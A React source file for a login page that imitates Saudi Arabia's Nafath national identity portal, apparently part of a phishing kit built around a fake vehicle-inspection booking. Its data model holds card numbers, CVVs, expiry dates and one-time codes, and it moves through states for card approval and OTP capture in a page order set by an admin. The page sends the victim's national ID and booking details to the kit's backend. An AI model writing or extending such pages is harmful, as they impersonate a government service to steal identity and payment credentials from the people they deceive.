import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { motion } from 'motion/react';
import { Smartphone, ShieldCheck, ArrowRight } from 'lucide-react';
import { getNextPagePath } from '../lib/flow';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED';
  otpCode: string;
  submittedOtp?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
  nafathCode?: string;
}

export function NafathLoginPage() {
  const navigate = useNavigate();
  const location = useLocation();

  const [nationalId, setNationalId] = useState('');
  const [password, setPassword] = useState('');
  const [formError, setFormError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Retrieve initial values from router state or localStorage
  const bookingState = (() => {
    if (location.state) {
      return location.state;
    }
    const saved = localStorage.getItem('last_booking_state');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return null;
      }
    }
    return null;
  })();

  const serviceName = bookingState?.bookingMeta?.serviceName || 'فحص دوري للمركبة';
  const amount = bookingState?.bookingMeta?.amount || '150.00';

  const handleNafathLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);

    if (!nationalId || nationalId.length !== 10 || !/^[12]\d{9}$/.test(nationalId)) {
      setFormError('يرجى إدخال رقم هوية وطنية أو إقامة صحيح مكون من 10 أرقام ويبدأ بـ 1 أو 2');
      return;
    }
    if (!password || password.length < 4) {
      setFormError('يرجى إدخال كلمة مرور صحيحة');
      return;
    }

    setIsSubmitting(true);

    try {
      const res = await fetch('/api/nafath-start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nationalId: nationalId,
          serviceName: serviceName,
          amount: amount,
          bookingMeta: bookingState?.bookingMeta || null,
          personalInfo: bookingState?.personalInfo || null,
          vehicleInfo: bookingState?.vehicleInfo || null,
        })
      });

      if (res.ok) {
        const data = await res.json();
        if (data && data.transaction) {
          localStorage.setItem('last_tx', JSON.stringify(data.transaction));
          
          // Redirect dynamically based on the flow order configured by admin
          setTimeout(async () => {
            const dynamicNext = await getNextPagePath('/nafath-login');
            navigate(dynamicNext || '/nafath-code', { state: { tx: data.transaction } });
          }, 1000);
        } else {
          setFormError('حدث خطأ أثناء الاتصال بنظام نفاذ الوطني.');
          setIsSubmitting(false);
        }
      } else {
        setFormError('خطأ في استجابة الخادم أثناء بدء نفاذ.');
        setIsSubmitting(false);
      }
    } catch (err) {
      console.error('Error starting Nafath session:', err);
      setFormError('حدث خطأ غير متوقع بالاتصال بشبكة الإنترنت.');
      setIsSubmitting(false);
    }
  };

  return (
    <div className="mx-auto px-4 py-12 sm:px-6 max-w-xl dir-rtl">
      <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
        <div className="h-2 bg-[#004d33] w-full" />

        <div className="p-6 sm:p-8 space-y-6 text-right">
          <div className="text-center pb-4 border-b border-gray-100">
            <div className="mx-auto w-14 h-14 rounded-full bg-emerald-50 flex items-center justify-center mb-3">
              <Smartphone className="h-7 w-7 text-[#004d33]" />
            </div>
            <h3 className="text-base font-black text-slate-800">بوابة النفاذ الوطني الموحد (نفاذ)</h3>
            <p className="text-xs text-slate-400 mt-1.5 leading-relaxed">يرجى تسجيل الدخول لمطابقة الهوية وتأكيد حجز الفحص الدوري لمركبتك عبر نفاذ</p>
          </div>

          {formError && (
            <div className="p-3 bg-rose-50 text-rose-600 rounded-xl text-xs font-bold border border-rose-100 animate-pulse text-right">
              ⚠️ {formError}
            </div>
          )}

          <form onSubmit={handleNafathLogin} className="space-y-5">
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">رقم الهوية الوطنية / الإقامة</label>
              <input
                type="text"
                maxLength={10}
                placeholder="1xxxxxxxxx"
                value={nationalId}
                onChange={(e) => setNationalId(e.target.value.replace(/\D/g, ''))}
                className="w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-xs font-medium text-slate-900 placeholder-slate-400 focus:border-[#004d33] focus:bg-white focus:outline-none focus:ring-1 focus:ring-[#004d33] font-sans text-right"
                disabled={isSubmitting}
                required
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">كلمة المرور المؤقتة</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full rounded-xl border border-gray-200 bg-gray-50/50 px-4 py-3.5 text-xs font-medium text-slate-900 placeholder-slate-400 focus:border-[#004d33] focus:bg-white focus:outline-none focus:ring-1 focus:ring-[#004d33] text-right"
                disabled={isSubmitting}
                required
              />
            </div>

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003a26] px-4 py-3.5 text-sm font-bold text-white shadow-lg transition-all cursor-pointer mt-6 disabled:opacity-75"
            >
              {isSubmitting ? (
                <span>جاري الاتصال بالنظام الوطني الموحد...</span>
              ) : (
                <>
                  <span>تسجيل الدخول والتحقق الرقمي</span>
                  <ArrowRight className="h-4 w-4 rotate-180" />
                </>
              )}
            </button>
          </form>

          <div className="pt-4 border-t border-gray-50 flex items-center justify-center gap-2 text-[10px] text-slate-400">
            <ShieldCheck className="w-4 h-4 text-[#004d33]" />
            <span>نظام توثيق مشفر آمن ومرتبط بقواعد البيانات الوطنية</span>
          </div>
        </div>
      </div>
    </div>
  );
}
